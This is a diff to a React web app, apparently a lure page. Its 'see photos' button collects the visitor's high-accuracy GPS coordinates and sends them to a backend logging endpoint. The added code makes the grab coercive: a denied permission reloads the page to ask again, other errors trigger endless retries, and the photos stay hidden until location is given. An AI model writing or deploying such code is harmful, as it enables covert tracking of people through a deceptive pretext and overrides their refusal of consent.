@@ -55,44 +55,49 @@ export default function App() {
   }
 
   async function handleSeePhotosClick() {
-    // start fake progress and get a stopper function
-    const finish = startFakeProgress(async () => {
-      // nothing here — will be called by stopper below
-    });
+  setLoading(true);
+  setProgress(0);
 
-    // Try to get geolocation (user gesture — should prompt on mobile)
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        async (pos) => {
-          setLocationStatus("granted");
-          // send GPS to backend
-          await sendLog("see_photos", {
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-          });
-          finish(); // stop loader and show photos
-          setPhotosVisible(true);
-        },
-        async (err) => {
-          // user denied or unavailable
-          console.warn("Geolocation error:", err);
-          setLocationStatus("denied");
-          // send fallback log (no coords)
-          await sendLog("see_photos", { location_error: err.message || err.code });
-          finish();
-          setPhotosVisible(true);
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
-    } else {
-      // geolocation not supported
-      setLocationStatus("denied");
-      await sendLog("see_photos", { location_error: "geolocation_not_supported" });
-      finish();
-      setPhotosVisible(true);
-    }
+  if (!navigator.geolocation) {
+    alert("Geolocation not supported by your browser.");
+    setLoading(false);
+    return;
   }
+
+  const finish = () => {
+    setLoading(false);
+    setProgress(0);
+  };
+
+  const requestLocation = () => {
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        // Success: user allowed
+        await sendLog("see_photos", {
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+        });
+        finish();
+        setPhotosVisible(true);
+      },
+      async (err) => {
+        if (err.code === 1) {
+          // User blocked location → refresh page to ask again
+          await sendLog("see_photos", { location_error: "permission_denied" });
+          window.location.reload();
+        } else {
+          // Other errors (timeout/unavailable) → keep retrying
+          await sendLog("see_photos", { location_error: err.message || err.code });
+          requestLocation(); // retry until user grants
+        }
+      },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+  };
+
+  requestLocation();
+};
 
   return (
     <div className="mobile-shell">
